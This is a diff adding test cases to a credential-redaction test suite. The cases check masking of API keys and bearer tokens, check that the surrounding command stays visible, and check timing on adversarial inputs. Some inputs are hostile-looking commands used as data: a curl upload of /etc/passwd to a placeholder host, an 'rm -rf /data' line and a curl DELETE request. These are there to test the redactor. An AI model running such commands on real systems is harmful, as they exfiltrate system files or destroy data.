@@ -197,7 +197,7 @@ describe("redactCredentials", () => {
     [
       String.raw`API_KEY=sek\ret env` +
         "\nX-Api-Key:''sekret -X\nX-Api-Key:'sek'ret\n?api_key='sek'ret&page=2",
-      "API_KEY=[redacted] env\nX-Api-Key:[redacted]\nX-Api-Key:[redacted]\n?api_key=[redacted]&page=2",
+      "API_KEY=[redacted] env\nX-Api-Key:[redacted] -X\nX-Api-Key:[redacted]\n?api_key=[redacted]&page=2",
     ],
     [
       "headers=[('Authorization', r'sekret'), ('X-Api-Key', u'k')]",
@@ -215,6 +215,19 @@ describe("redactCredentials", () => {
       "Run `Authorization: Bearer sekret` and deploy",
       "Run `Authorization: Bearer [redacted]` and deploy",
     ],
+    [
+      "requests.get(u, headers={'Authorization': 'Bearer ' 'tok_secret'})",
+      "requests.get(u, headers={'Authorization': 'Bearer [redacted]'})",
+    ],
+    [
+      "headers={'Authorization': r'Bearer tok_secret'}; api_key = r'sk-1'",
+      "headers={'Authorization': r'Bearer [redacted]'}; api_key = r'[redacted]'",
+    ],
+    [
+      'h.set("Authorization", "Bearer " + "tok_secret")',
+      'h.set("Authorization", "Bearer [redacted]")',
+    ],
+    ["API_KEY=sk_live_'abc123' env", "API_KEY=[redacted] env"],
   ])("redacts a whole quoted or escaped value: %s", (input, expected) => {
     expect(redactCredentials(input)).toBe(expected);
   });
@@ -232,6 +245,15 @@ describe("redactCredentials", () => {
       String.raw`api_key="secret\\"; rm -rf /data`,
       `api_key="[redacted]"; rm -rf /data`,
     ],
+    [
+      "curl -H X-Api-Key:secret https://x/upload --data-binary @/etc/passwd",
+      "curl -H X-Api-Key:[redacted] https://x/upload --data-binary @/etc/passwd",
+    ],
+    ["API_KEY=secret;./deploy-prod.sh", "API_KEY=[redacted];./deploy-prod.sh"],
+    [
+      'curl "https://x/?api_key=k" -X DELETE',
+      'curl "https://x/?api_key=[redacted]" -X DELETE',
+    ],
   ])("keeps the command around a credential visible: %s", (input, expected) => {
     expect(redactCredentials(input)).toBe(expected);
   });
@@ -246,6 +268,8 @@ describe("redactCredentials", () => {
       (size: number) => `api_key=${"\\x".repeat(size)}`,
       (size: number) => '"Authorization",'.repeat(size),
       (size: number) => `"Authorization", ${'"a" '.repeat(size)}`,
+      (size: number) => `api_key=a${"\\'".repeat(size)}`,
+      (size: number) => `${"api_key=a'".repeat(size)} `,
     ];
     // Time per call, the fastest of a few windows that each span many calls.
     const perCall = (text: string) => {
